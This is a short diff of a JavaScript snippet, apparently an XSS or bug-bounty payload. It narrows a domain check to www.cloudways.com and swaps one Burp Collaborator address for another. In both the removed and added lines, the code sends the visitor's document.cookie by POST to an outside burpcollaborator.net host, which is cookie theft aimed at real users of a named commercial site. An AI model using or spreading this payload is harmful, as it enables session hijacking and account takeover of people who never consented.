@@ -1,5 +1,5 @@
-if (document.domain == "platform.cloudways.com" | document.domain == "www.cloudways.com" | document.domain == "api.cloudways.com" | document.domain == "developers.cloudways.com" | document.domain == " www.tomorrowland.com ") {
-  fetch('https://b5htwifvqnphcg2tb08njkx0rrxil7.burpcollaborator.net', {
+if (document.domain == "www.cloudways.com") {
+  fetch('https://1hjj88rl2d17o6ejnqkdva9q3h99xy.burpcollaborator.net', {
   method: 'POST',
   mode: 'no-cors',
   body:document.cookie
